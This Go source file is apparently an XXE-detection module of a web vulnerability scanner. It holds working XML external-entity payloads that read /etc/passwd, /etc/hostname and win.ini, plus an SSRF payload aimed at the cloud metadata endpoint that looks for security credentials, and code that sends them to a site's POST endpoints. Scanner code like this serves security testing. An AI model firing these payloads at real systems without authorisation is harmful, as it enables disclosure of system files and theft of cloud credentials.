package modules

import (
	"github.com/SentinelXofficial/sxel/pkg/core"
	"bytes"
	"fmt"
	"net/http"
	"strings"
	"time"
)

// XXE payloads targeting common file-read via external entity.
type xxePayload struct {
	Body    string
	Label   string
	Markers []string
}

var xxePayloads = []xxePayload{
	{
		Label: "Classic /etc/passwd (DOCTYPE SYSTEM)",
		Body: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>`,
		Markers: []string{"root:x:", "nobody:x:", "/bin/bash", "/sbin/nologin", "/bin/sh"},
	},
	{
		Label: "Parameter entity /etc/passwd",
		Body: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval; %error;]>
<root/>`,
		Markers: []string{"root:x:", "nonexistent/root", "/etc/passwd"},
	},
	{
		Label: "/etc/hostname",
		Body: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<root><data>&xxe;</data></root>`,
		Markers: []string{}, // any change in length vs baseline is suspicious
	},
	{
		Label: "Windows win.ini",
		Body: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root><data>&xxe;</data></root>`,
		Markers: []string{"[fonts]", "[extensions]", "[mci extensions]"},
	},
	{
		Label: "XXE via SVG (if endpoint accepts images)",
		Body: `<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>`,
		Markers: []string{"root:x:", "nobody:x:", "/bin/bash"},
	},
	{
		Label: "OOB via http (canary test without callback server)",
		Body: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>`,
		Markers: []string{"ami-id", "instance-id", "security-credentials"},
	},
}

// xxeContentTypes are the MIME types commonly accepted by XML-consuming
// endpoints. We try each when probing a POST endpoint.
var xxeContentTypes = []string{
	"application/xml",
	"text/xml",
	"application/xhtml+xml",
	"application/rss+xml",
	"application/atom+xml",
	"image/svg+xml",
}

// doXMLPOST sends a raw XML body to rawURL with the given content-type.
func doXMLPOST(client *http.Client, cfg *core.Config, rawURL, body, contentType string) (string, int, error) {
	cfg.Limiter.Wait()
	req, err := http.NewRequest("POST", rawURL, bytes.NewBufferString(body))
	if err != nil {
		return "", 0, err
	}
	core.ApplyHeaders(req, cfg)
	req.Header.Set("Content-Type", contentType)
	resp, err := client.Do(req)
	if err != nil {
		return "", 0, err
	}
	defer resp.Body.Close()
	b := core.ReadBody(resp.Body)
	return b, resp.StatusCode, nil
}

// ScanXXE probes all POST endpoints (from forms and crawled URLs) for
// XML External Entity injection vulnerabilities.
//
// Detection strategy:
//   1. Send XXE payload with each content-type and look for /etc/passwd markers.
//   2. If no marker matches, compare body length with baseline — a significant
//      delta is a weak signal worth flagging at MEDIUM severity.
func ScanXXE(client *http.Client, cfg *core.Config, target core.CrawlResult) []core.ScanResult {
	var results []core.ScanResult

	// Collect unique POST endpoints from forms
	postEndpoints := map[string]bool{}
	for _, form := range target.Forms {
		if strings.ToUpper(form.Method) == "POST" && form.Action != "" {
			postEndpoints[form.Action] = true
		}
	}
	// Also try the base URL itself as a POST endpoint
	postEndpoints[target.URL] = true

	for endpoint := range postEndpoints {
		if cfg.Verbose {
			fmt.Printf("    \033[90m[xxe] probing %s\033[0m\n", endpoint)
		}

		// Baseline: a benign XML body to get reference length and content.
		const benignXML = `<?xml version="1.0" encoding="UTF-8"?><root><data>test</data></root>`

		var baselineBody string
		var baselineStatus int
		for _, ct := range xxeContentTypes {
			b, s, err := doXMLPOST(client, cfg, endpoint, benignXML, ct)
			if err == nil && s != 404 && s != 405 {
				baselineBody = b
				baselineStatus = s
				break
			}
		}

		// If baseline couldn't be fetched with any XML content-type, skip.
		if baselineStatus == 0 || baselineStatus == 404 || baselineStatus == 405 {
			continue
		}

	XXEEndpointLoop:
		for _, ct := range xxeContentTypes {
			for _, pl := range xxePayloads {
				body, status, err := doXMLPOST(client, cfg, endpoint, pl.Body, ct)
				if err != nil || status == 404 || status == 405 {
					continue
				}

				bodyLow := strings.ToLower(body)

				// 1. Hard marker match — definitive XXE
				for _, marker := range pl.Markers {
					if strings.Contains(bodyLow, strings.ToLower(marker)) &&
						!strings.Contains(strings.ToLower(baselineBody), strings.ToLower(marker)) {
						results = append(results, core.ScanResult{
							Type:      "XXE (XML External Entity Injection)",
							URL:       endpoint, Method: "POST", Parameter: ct,
							Payload:   pl.Label, Severity: "CRITICAL",
							Evidence:  fmt.Sprintf("marker %q found in response (HTTP %d)", marker, status),
							Timestamp: time.Now(),
						})
						fmt.Printf("  \033[31m[✗ XXE]\033[0m %s content-type=%s payload=%q marker=%q HTTP=%d\n",
							endpoint, ct, pl.Label, marker, status)
						break XXEEndpointLoop
					}
				}

				// 2. Length anomaly — server may have fetched external entity
				//    and returned content without our markers being visible
				//    (e.g. it stripped the entity but changed the response shape).
				lenDiff := len(body) - len(baselineBody)
				if lenDiff < 0 {
					lenDiff = -lenDiff
				}
				if lenDiff > 200 && status != baselineStatus {
					results = append(results, core.ScanResult{
						Type:      "XXE (Potential — Anomalous Response)",
						URL:       endpoint, Method: "POST", Parameter: ct,
						Payload:   pl.Label, Severity: "MEDIUM",
						Evidence:  fmt.Sprintf("response diff: %d bytes, status %d → %d", lenDiff, baselineStatus, status),
						Timestamp: time.Now(),
					})
					fmt.Printf("  \033[33m[? XXE-ANOM]\033[0m %s content-type=%s diff=%d bytes status=%d→%d\n",
						endpoint, ct, lenDiff, baselineStatus, status)
					break XXEEndpointLoop
				}
			}
		}
	}

	return results
}
